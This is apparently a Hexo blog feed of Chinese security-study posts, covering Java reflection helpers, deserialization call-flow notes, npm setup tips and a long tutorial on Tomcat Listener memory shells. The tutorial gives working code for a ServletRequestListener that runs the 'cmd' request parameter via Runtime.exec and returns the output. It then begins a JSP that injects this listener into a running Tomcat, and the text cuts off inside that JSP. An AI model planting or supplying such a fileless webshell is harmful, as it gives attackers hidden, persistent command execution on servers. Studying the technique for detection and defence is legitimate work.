field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(simpleName) || <span class="string">&quot;ArrayList&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是Map或者HashMap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMap</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(simpleName) || <span class="string">&quot;HashMap&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查object是否为java的基本数据类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkObjectIsSysType</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">objType</span> <span class="operator">=</span> object.getClass().toString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;byte&quot;</span>.equals(objType) || <span class="string">&quot;short&quot;</span>.equals(objType) || <span class="string">&quot;int&quot;</span>.equals(objType) || <span class="string">&quot;long&quot;</span>.equals(objType) || <span class="string">&quot;double&quot;</span>.equals(objType) || <span class="string">&quot;float&quot;</span>.equals(objType) || <span class="string">&quot;boolean&quot;</span>.equals(objType)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="json截取"><a href="#json截取" class="headerlink" title="json截取"></a>json截取</h2><p>思想非常简单就是将对象转换成json数据，然后在去截断我们需要的属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法二：从复杂对象中获取string类型的目标属性targetProName的值</span></span><br><span class="line"><span class="comment">     * 把对象转换成json字符串，然后截取第一次出现的targetProName的值</span></span><br><span class="line"><span class="comment">     * 适用条件：同方法一</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 复杂对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetProName 目标属性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBusinessNoFromArg</span><span class="params">(Object object,String targetProName)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(object);</span><br><span class="line">    System.err.println(<span class="string">&quot;jsonString=&quot;</span> + jsonString);</span><br><span class="line">    jsonString = StringUtils.substringAfter(jsonString,<span class="string">&quot;\&quot;&quot;</span>+targetProName + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);<span class="comment">//去截断目标属性</span></span><br><span class="line">    jsonString = StringUtils.substringBefore(jsonString,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> jsonString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;seacherobj&quot;&gt;&lt;a href=&quot;#seacherobj&quot; class=&quot;headerlink&quot; title=&quot;seacherobj&quot;&gt;&lt;/a&gt;seacherobj&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;学习一下searcherobj的方法&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/readobject%E6%B7%B1%E5%85%A5/"/>
    <id>http://example.com/2022/11/19/readobject%E6%B7%B1%E5%85%A5/</id>
    <published>2022-11-19T12:08:37.958Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p><img src="/2022/11/19/readobject%E6%B7%B1%E5%85%A5/readobject.jpg" alt><br>ObjectInputSteram.readObject()</p><p>readObject0()</p><p>readOrdinaryObject()</p><p>desc = readClassDesc(false)</p><p>descriptor = readNonProxyDesc(unshared)</p><p>readDesc = readClassDescriptor()</p><p>cl = resolveClass(readDesc)</p><p>filterCheck(cl, -1)</p><p>desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false))<br>各種初始化、檢查 suid 等</p><p>return desc</p><p>return descriptor</p><p>obj = desc.isInstantiable() ? desc.newInstance() : null</p><p>readSerialData(obj, desc)</p><p>slotDesc.invokeReadObject(obj, this)</p><p>readObjectMethod.invoke(obj, new Object[]{ in })</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;流程：&quot;&gt;&lt;a href=&quot;#流程：&quot; class=&quot;headerlink&quot; title=&quot;流程：&quot;&gt;&lt;/a&gt;流程：&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/11/19/readobject%E6%B7%B1%E5%85%A5/readobject.jpg&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/README/"/>
    <id>http://example.com/2022/11/19/README/</id>
    <published>2022-11-19T12:08:37.945Z</published>
    <updated>2021-03-04T14:58:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍一些nodejs中的安全问题"><a href="#介绍一些nodejs中的安全问题" class="headerlink" title="介绍一些nodejs中的安全问题"></a>介绍一些nodejs中的安全问题</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍一些nodejs中的安全问题&quot;&gt;&lt;a href=&quot;#介绍一些nodejs中的安全问题&quot; class=&quot;headerlink&quot; title=&quot;介绍一些nodejs中的安全问题&quot;&gt;&lt;/a&gt;介绍一些nodejs中的安全问题&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/npm%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/11/19/npm%E4%BD%BF%E7%94%A8/</id>
    <published>2022-11-19T12:08:37.945Z</published>
    <updated>2021-03-04T14:58:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><p>当我们没有项目的时候需要通过<code>npm -init</code>来部署一个项目</p><p><a href="https://www.cnblogs.com/WD-NewDemo/p/11141384.html">使用“npm init”初始化项目</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package name:                      你的项目名字叫啥</span><br><span class="line">version:                          版本号</span><br><span class="line">description:                       对项目的描述</span><br><span class="line">entry point:                      项目的入口文件（一般你要用那个js文件作为node服务，就填写那个文件）</span><br><span class="line">test command:                     项目启动的时候要用什么命令来执行脚本文件（默认为node app.js）</span><br><span class="line">git repository:                    如果你要将项目上传到git中的话，那么就需要填写git的仓库地址（这里就不写地址了）</span><br><span class="line">keywirds：                       项目关键字（我也不知道有啥用，所以我就不写了）</span><br><span class="line">author:                         作者的名字（也就是你叫啥名字）</span><br><span class="line">license:                        发行项目需要的证书（这里也就自己玩玩，就不写了）</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/controllerha/article/details/84256852">npm安装报错npm ERR! Refusing to install package with name “xxxx” under a packagexxxx</a></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>检查package.json下的name字段是不是项目名字和你安装的那个包名字相同了，如果一样就会报那个错，把项目名字改成和你安装不冲突的名字</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;npm&quot;&gt;&lt;a href=&quot;#npm&quot; class=&quot;headerlink&quot; title=&quot;npm&quot;&gt;&lt;/a&gt;npm&lt;/h2&gt;&lt;p&gt;当我们没有项目的时候需要通过&lt;code&gt;npm -init&lt;/code&gt;来部署一个项目&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/11/19/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-11-19T12:08:37.933Z</published>
    <updated>2022-11-04T08:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马之Listener"><a href="#Tomcat内存马之Listener" class="headerlink" title="Tomcat内存马之Listener"></a>Tomcat内存马之Listener</h1><h2 id="初识Tomcat内存马"><a href="#初识Tomcat内存马" class="headerlink" title="初识Tomcat内存马"></a>初识Tomcat内存马</h2><p>关于内存马，第一次接触是 PHP 的不死马，其原理是在内存中执行死循环，并删除自身文件，起到维持权限的作用，而 Tomcat 的内存马原理则与其不同。</p><p>在前面的学习我们知道，在 Java 程序中，HTTP 的请求会按照<code>Listener --&gt; Filter --&gt; Servlet</code>的顺序经过这三大组件，Tomcat 内存马则在请求的过程中修改程序本身的组件或者注册新的恶意组件到 Tomcat 服务器中，插入恶意代码，完成内存马的注入。</p><p>Tomcat 内存马技术的实现依赖于<code>Servlet 3.0</code>版本之后的动态注册组件，而 Tomcat 7.x 版本才开始支持<code>Servlet 3.0</code>。</p><h2 id="Tomcat基础知识"><a href="#Tomcat基础知识" class="headerlink" title="Tomcat基础知识"></a>Tomcat基础知识</h2><p>在学习 Java 内存马之前，我们得了解一些关于 Tomcat 的基础知识。</p><p>Tomcat 本身是由 Apache 软件基金会属下 Jakarta 开发的 Servlet 容器，目的是实现对 Servlet 和 JSP 的支持。其广为人知的是充当 Java 程序的 Web服务器，这是因为在 Tomcat 中内嵌了 HTTP 服务器。</p><p>Tomcat 对于 HTTP 请求的处理可以简化成如下图所示：<br><img src="images/image-20221026123041907.png" alt="image-20221026123041907"></p><p>Tomcat 通过<code>Connector</code>组件接收并解析 HTTP 请求报文，创建<code>ServletRequest</code>对象发送给<code>Container</code>容器进行处理。<code>Container</code>容器处理完之后将响应封装成<code>ServletResponse</code>对象返回到<code>Connector</code>组件，<code>Connector</code>将其转换成 HTTP 响应报文返回到客户端，完成一次请求响应动作。</p><p>下面简单了解一下其中的组件和服务。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><code>Server</code>指代整个 Tomcat 服务器，主要提供接口让其他程序能访问到<code>Service</code>里面，同时维护它所包含的所有<code>Service</code>生命周期（初始化到服务结束等）。Tomcat 只存在一个<code>Server</code>，而<code>Server</code>中至少存在一个<code>Service</code>组件。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p><code>Service</code>包含<code>Connector</code>、<code>Container</code>和其他若干组件，对外提供服务。一个<code>Service</code>可以设置多个<code>Connector</code>组件，但只能有一个<code>Container</code>容器。Tomcat 中<code>Service</code>接口的标准实现类是<code>StandardService</code>，该类还实现了<code>Lifecycle</code>接口用于控制下面组件的生命周期。</p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p><code>Connector</code>组件是 Tomcat 中的核心组件之一，主要任务是接受客户端发送的 tcp 连接请求，创建 Request 和 Response 对象分别用于和请求端交换数据，接着生成线程用于处理这两个对象，最后转换成<code>ServletRequest</code>对象传递给<code>Container</code>容器。总结其功能如下：</p><ol><li>和客户端建立通信。</li><li>解析和处理应用层协议，将其封装成 Request 和 Response 对象，将 Request 对象转换成<code>ServletRequest</code>对象，传递给<code>Container</code>容器。</li><li>接收<code>Container</code>传递回来的<code>ServletResponse</code>对象，处理成 Response 对象，转换成 HTTP 响应报文返回到客户端。</li></ol><p>总结图如下所示：<br><img src="images/image-20221026144545789.png" alt="image-20221026144545789"></p><p>从图中可以看到，<code>Connector</code>组件的工作由这三个子组件：<code>EndPoint</code>、<code>Processor</code>和<code>Adapter</code>共同完成，分别负责的功能如下：</p><ul><li><code>EndPoint</code>：负责网络通信，传递字节流到<code>Processor</code>。</li><li><code>Processor</code>：负责处理字节流生成 Tomcat Request 对象，传递到<code>Adapter</code>。</li><li><code>Adapter</code>：负责处理 Tomcat Request 对象，将其转换成<code>ServletRequest</code>。</li></ul><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p><code>Container</code>，别名为<code>Catalina</code>，用于处理<code>Connector</code>组件传递过来的<code>ServletRequest</code>请求。<code>Container</code>容器采用责任链的设计模式，含有四个子容器：<code>Engine</code>、<code>HOST</code>、<code>Context</code>和<code>Wrapper</code>。这四个子容器不是平行关系，而是父子关系，包含关系如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Engine &lt;-- Host &lt;-- Context &lt;-- Wrapper</span><br></pre></td></tr></table></figure><ul><li><code>Engine</code>：最顶层容器组件，包含多个<code>HOST</code>，实现类为<code>org.apache.catalina.core.StandardEngine</code>。</li><li><code>HOST</code>：代表一个虚拟主机，每个虚拟主机和对应域名进行匹配，包含多个<code>Context</code>，实现类为<code>org.apache.catalina.core.StandardHost</code>。</li><li><code>Context</code>：上下文容器，一个<code>Context</code>代表一个 WEB 应用，包含多个<code>Wrapper</code>，实现类为<code>org.apache.catalina.core.StandardContext</code>。</li><li><code>Wrapper</code>：一个<code>Wrapper</code>代表一个<code>Servlet</code>，是对<code>Servlet</code>的抽象包装。<code>Wrapper</code>负责管理<code>Servlrt</code>，包括<code>Servlet</code>的装载、初始化、执行和资源回收等，实习类为<code>org.apache.catalina.core.StandardWrapper</code>。</li></ul><p>示例图如下所示：<img src="images/image-20210402150543076.png" alt="image-20210402150543076"></p><h2 id="Listener型内存马的实现"><a href="#Listener型内存马的实现" class="headerlink" title="Listener型内存马的实现"></a>Listener型内存马的实现</h2><p>在前面的 JavaWeb 基础学习时，我们了解了一些<code>Listener</code>监听器。在这其中，最适合作为内存马的监听器为<code>ServletRequestListener</code>，它用于监听 ServletRequest 对象的创建和销毁过程，因此当我们发起任意请求时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p><p>编写一个<code>ServletRequestListener</code>接口的实现类进行测试：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问任意路由都可以执行命令<br><img src="images/image-20221028161656771.png" alt="image-20221028161656771"></p><p>不过这仅仅实现了未回显的命令执行，既然实现了命令执行，我们就得要做到回显。在 java 中，我们可以通过<code>request</code>类的<code>getResponse()</code>方法获取<code>response</code>对象<br><img src="images/image-20221028115517545.png" alt="image-20221028115517545"></p><p>那么如何获取到<code>request</code>类呢？在<code>requestInitialized()</code>方法中预设给我们传入了<code>ServletRequestEvent</code>对象，我们跟进看看<br><img src="images/image-20221028115757707.png" alt="image-20221028115757707"></p><p>这里存在一个<code>ServletRequest</code>类型的<code>request</code>字段，并且通过<code>getServletRequest()</code>方法可以拿到，而<code>servletRequestEvent</code>类可以转换成<code>HttpServletRequest</code>类型接口。</p><p><code>HttpServletRequest</code>类接口是继承<code>ServletRequest</code>接口，而<code>Request</code>类是<code>HttpServletRequest</code>接口的实现类。</p><p>因此我们可以通过反射拿到<code>ServletRequest</code>类中的<code>request</code>实例，然后经过强转类型获得<code>Request</code>对象类型<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>命令执行结果成功回显<img src="images/image-20221028160217726.png" alt="image-20221028160217726"></p><p>既然我们可以通过恶意的<code>ServletRequestListener</code>实现类触发命令执行，那么接下来就是考虑如何动态注册进服务器中的问题。</p><p>在<code>Runtime.getRuntime().exec()</code>打上断点，然后带上 cmd 参数执行一次弹出计算器看看调用栈<br><img src="images/image-20221027222247432.png" alt="image-20221027222247432"></p><p>可以看到我们构造的<code>ListenerTest()</code>方法的前一个是<code>StandardContext#fireRequestInitEvent()</code>方法，跟进该方法<br><img src="images/image-20221027224618262.png" alt="image-20221027224618262"></p><p>第一行调用了<code>getApplicationEventListeners()</code>方法获取对象数组，跟进该方法<br><img src="images/image-20221027225000747.png" alt="image-20221027225000747"></p><p>可以看到，<code>applicationEventListenersList</code>字段已经存储了我们的<code>ListenerTest</code>类<br><img src="images/image-20221027225147776.png" alt="image-20221027225147776"></p><p>也就是之前已经将<code>ListenerTest</code>类注册进了 Tomcat 服务器，既然是添加我们的恶意类到<code>applicationEventListenersList</code>列表中，那么一定会有一个添加的方法，尝试在该类中全局搜索<code>applicationEventListenersList</code>关键字，最后定位到了<code>addApplicationEventListener()</code>方法<br><img src="images/image-20221027225815382.png" alt="image-20221027225815382"></p><p>因此我们可以通过<code>addApplicationEventListener()</code>方法去将我们的恶意类添加到<code>listener</code>中进行注册，接下来继续跟着方法往下走<br><img src="images/image-20221027230816656.png" alt="image-20221027230816656"></p><p>对获取到的<code>instances</code>数组遍历并进行实例化，最终调用<code>requestInitialized()</code>方法。</p><p>接下来就是如何去获取<code>StandardContext</code>类，网上可以看到师傅们都挖出了很多种办法，关于<code>StandardContext</code>类的调用寻找日后有兴趣再慢慢聊吧。这里取其中一种：<code>StandardHostValve#invoke()</code>方法中可以通过<code>request</code>对象的<code>getContext()</code>方法获取到<code>StandardContext</code>类，而 JSP 本身就内置了<code>request</code>对象<br><img src="images/image-20221027231340401.png" alt="image-20221027231340401"></p><p>接下来就是编写 Listener 型内存马<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">23</span>:<span class="number">16</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span 